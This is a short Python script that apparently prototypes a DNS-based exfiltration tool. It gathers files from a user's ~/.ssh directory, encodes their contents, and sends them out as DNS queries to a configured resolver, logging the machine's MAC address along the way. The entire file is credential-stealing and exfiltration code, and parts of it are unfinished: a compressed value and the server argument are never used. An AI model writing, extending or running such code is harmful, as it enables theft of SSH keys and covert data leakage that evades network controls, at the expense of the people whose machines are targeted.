from extractor import Extractor
from lib.data_encoder import Encoder 
import hashlib
import dns.resolver
import zlib
from uuid import getnode as get_mac

my_resolver = dns.resolver.Resolver()
my_resolver.nameservers = ['127.0.0.1']

def send_file_to_server(encoded_file):
    results = []
    for part in encoded_file:
        compressed_part = zlib.compress(part.encode('ascii'))
        print(part)
        print(len(part))
        result = my_resolver.query(part)
        results.append(result)
    return results

def encode_file_contents(files):
    encoder = Encoder()
    encoded_file_contents = []
    for file_name in files:
        with open(file_name, 'r') as f:
            contents = f.read()
            hash = hashlib.sha256(file_name.encode('utf-8')).hexdigest()[:4]
            encoded_file_contents.append(encoder.encode(hash, "file", contents))
    return encoded_file_contents

def send_files_to_server(sensitive_files, server_ip):
    encoded_file_contents = encode_file_contents(sensitive_files)
    results = dict()
    for file in encoded_file_contents:
        results[file] = send_file_to_server(file)

def start():
    mac = get_mac()
    print(mac)
    sensitive_files = Extractor().get_sensitive_files('/Users/coldsauce/.ssh')
    send_files_to_server(sensitive_files, '127.0.0.1')

if __name__ == '__main__':
    start()
